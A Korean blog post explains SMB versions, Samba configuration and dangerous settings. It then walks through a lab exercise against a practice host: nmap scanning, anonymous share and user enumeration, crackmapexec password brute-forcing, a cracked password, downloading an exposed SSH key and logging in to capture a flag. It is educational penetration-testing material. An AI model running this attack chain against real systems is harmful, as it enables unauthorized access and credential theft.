---
title: "SMB"
date: 2025-09-25
layout: single
author_profile: true
toc: true
toc_label: "SMB"
toc_icon: "book"
toc_sticky: true
header:
  teaser: /assets/images/smb.png
tags: [network, smb]
---

**SMB (Server Message Block)**는 파일, 디렉터리뿐 아니라 프린터, IPC 등 네트워크 자원 접근을 규정하는 클라이언트/서버 프로토콜이다. Windows 계열의 네트워크 서비스에서 주로 사용되며, Samba 프로젝트를 통해 Linux/Unix에서도 호환, 운영이 가능하다.

SMB는 네트워크 상의 다른 호스트가 공유한 리소스(share)에 접속해 파일을 읽고 쓰는 방식으로 동작한다. SMB 통신은 TCP를 통해 이루어지며(기본적으로 445/tcp, 과거 NetBIOS 연동시 137/138/139), 연결 수립 전 TCP 3-way handshake를 거친다.

---

# SMB 개요 및 버전

- **역할**: 파일/프린터 공유, 원격 실행·관리, 네임/보안 관리 등  
- **프로토콜/포트**: 445/tcp (CIFS 포함), NetBIOS: 137/138/139 (레거시)  
- **주요 버전**
  - CIFS (SMB1) — Windows NT4 / NetBIOS 기반
  - SMB 1.0 — Windows 2000
  - SMB 2.0 / 2.1 — Vista/Server2008 이상 (성능/메시지 최적화)
  - SMB 3.0 / 3.1.1 — Windows 8/10, 암호화/무결성 등 보안 기능 추가

| SMB Version | 지원 OS (예시) | 주요 기능 |
|-------------|----------------|----------|
| CIFS (SMB1) | Windows NT4    | NetBIOS 인터페이스 통신 |
| SMB 1.0     | Windows 2000   | TCP 직접 연결 |
| SMB 2.x     | Vista / Server2008 | 성능, 캐시, 서명 개선 |
| SMB 3.x     | Windows 8 / Server2012+ | 멀티채널, 암호화, 무결성 |

---

# Samba(리눅스 구현)

Samba는 Linux/Unix 환경에서 SMB/CIFS를 구현한 소프트웨어다. Samba 3~4대에서는 도메인 멤버/도메인 컨트롤러 기능이 확장되어 AD 통합도 가능하다. Samba는 보통 다음 데몬으로 구성된다.

- `smbd` - 파일·프린터 서비스 제공 (SMB 프로토콜)  
- `nmbd` - NetBIOS 네임 서비스 (필요 시)  
- (Samba4 이상) AD 기능을 위한 추가 데몬들

---

# 기본 구성

```bash
$ cat /etc/samba/smb.conf | grep -v "#\|\;" # (주석/세미콜론 라인 제외 후 확인)
```

| 설정 | 설명 |
| --- | --- |
| workgroup = WORKGROUP/DOMAIN | 네트워크 상 표시될 작업 그룹명 |
| path = /path/here/ | share 경로 |
| browseable = yes | 탐색 목록에 표시 여부 |
| guest ok = yes | 비인증(익명) 접속 허용 여부 | 
| map to guest = bad user | 인증 실패 시 guest로 매핑 규칙 | 
| create mask / directory mask = 0700 | 새 파일/디렉터리 권한 |

---

# 위험한 설정

아래 설정들은 편의성 때문에 활성화하면 보안상 큰 위험을 초래할 수 있다.

| 설정 | 설명 |
|------|------|
| guest ok = yes / usershare allow guests = yes | 익명 접속 허용 |
| browseable = yes | 공유 목록 노출 |
| writable = yes | 쓰기 허용 (파일 생성/수정) |
| enable privileges = yes | SID 기반 특권(권한) 허용 |
| create mask = 0777 / directory mask = 0777 | 과도한 권한 부여 |
| unix password sync = yes / pam password change | 계정 동기화 위험 |

---

# 실습

## Portscan

먼저 대상 Host(`10.129.203.6`)에 대해 기본 스크립트와 서비스 버전 탐지를 수행하였다.

```bash
$ nmap -sC -sV 10.129.203.6                     
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-26 02:33 EDT
Nmap scan report for 10.129.203.6
Host is up (0.28s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 71:08:b0:c4:f3:ca:97:57:64:97:70:f9:fe:c5:0c:7b (RSA)
|   256 45:c3:b5:14:63:99:3d:9e:b3:22:51:e5:97:76:e1:50 (ECDSA)
|_  256 2e:c2:41:66:46:ef:b6:81:95:d5:aa:35:23:94:55:38 (ED25519)
53/tcp   open  domain      ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
139/tcp  open  netbios-ssn Samba smbd 4
445/tcp  open  netbios-ssn Samba smbd 4
2121/tcp open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (InlaneFTP) [10.129.203.6]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port2121-TCP:V=7.95%I=7%D=9/26%Time=68D633C4%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,8B,"220\x20ProFTPD\x20Server\x20\(InlaneFTP\)\x20\[10\.129\.
SF:203\.6\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20creat
SF:ive\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20creative\r
SF:\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: 1s
|_nbstat: NetBIOS name: ATTCSVC-LINUX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-09-26T06:34:01
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 77.27 seconds
```


Nmap 스캔을 통해 `SSH`, `DNS`, `SMB`, `FTP` 등 총 5개의 주요 서비스가 확인되었으며,
특히 **Samba 공유(139/445)** 는 인증 우회, 익명 접근 시도를 통해
파일 획득이나 초기 침투 지점으로 활용될 가능성이 있다.


## SMB File share

`smbclient` 를 이용해 대상 서버의 공유 목록을 확인하였다. `-L` 옵션은 **서버의 공유(share) 목록을 열람**하기 위한 것이고, `-N` 옵션은 **null 세션(익명 세션)으로 접속**하도록 지정한다.

```bash
$ smbclient -N -L //10.129.203.6 
```

위 명령을 실행하면 다음과 같이 공유 목록이 출력된다.

![Domain](/assets/network-screenshots/smb/file-share.png)

이후 `smbmap`명령어를 이용하여 **각 공유에 대한 접근 가능 여부**를 테스트하였다.

```bash
$ smbmap -H 10.129.203.6 -r GGJ
```

GGJ 폴더가 접근이 가능한 상태였고, `-r` 옵션을 활용하여 GGJ 공유 폴더 내부에 있는 파일들을 열람하였다.

![Domain](/assets/network-screenshots/smb/smbmap.png)

## rpcclient

`smbmap` 결과에서 **`id_rsa` 파일이 존재함**을 확인하였다.  
이후 `rpcclient` 명령어를 사용하여 SMB 공유 폴더의 **사용자 계정 정보를 수집**하였다.

```bash
$ rpcclient -U "" 10.129.203.6
```

명령어 실행 후 `enumdomusers` 명령어를 통하여 smb 사용자의 대한 정보를 열람 하였다. 
그 결과, 사용자 명은 `jason`, `robin` 이 존재함을 확인하였다.

![Domain](/assets/network-screenshots/smb/rpcclient.png)

이 후, `crackmapexec` 명령어를 사용하여 `jason` 사용자의 비밀번호 브루트 포싱을 시도하였다.

`--local-auth` 옵션은 **도메인 계정이 아닌 로컬 계정 인증**을 강제하기 위해 사용한다.

```bash
$ crackmapexec smb 10.129.203.6 -u jason -p pws.list --local-auth
```

![Domain](/assets/network-screenshots/smb/brute-force.png)

브루트 포싱 결과, `jason`의 계정 비밀번호가 `34c8zuNBo91!@28Bszh` 와 일치함을 확인하였다.

## File download

`smbmap` 명령어를 이용하여 `id_rsa` 의 파일을 로컬로 다운로드 하였다.

```bash
$ smbmap -u 'jason' -p '34c8zuNBo91!@28Bszh' -H 10.129.203.6 -r GGJ -A id_rsa
```

## SSH connect

우선 먼저 `chmod` 명령어를 이용하여 `id_rsa` 키의 권한을 `600`으로 설정하였다.

```bash
$ chmod 600 10.129.203.6-GGJ_id_rsa
```

이후, 아까 확인 한 `nmap` 결과에서 **SSH(포트 22)** 가 열려 있음을 확인하고, 획득한 `id_rsa` 개인키를 사용해 `jason` 계정으로 SSH 접속을 시도하였다.

```bash
$ ssh -i 10.129.203.6-GGJ_id_rsa jason@10.129.203.6
```

`jason` 사용자의 SSH 접속에 성공하였다.

![Domain](/assets/network-screenshots/smb/ssh-connect.png)

## Flag 획득

원격 호스트에서 `ls` 명령어를 사용하여 내부 디렉토리 파일들을 확인하니, `flag.txt` 라는 파일이 존재하였다. 
이 파일을 열람한 결과, 

![Domain](/assets/network-screenshots/smb/flag.png)

이렇게 최종적으로 **flag**를 확보할 수 있었다.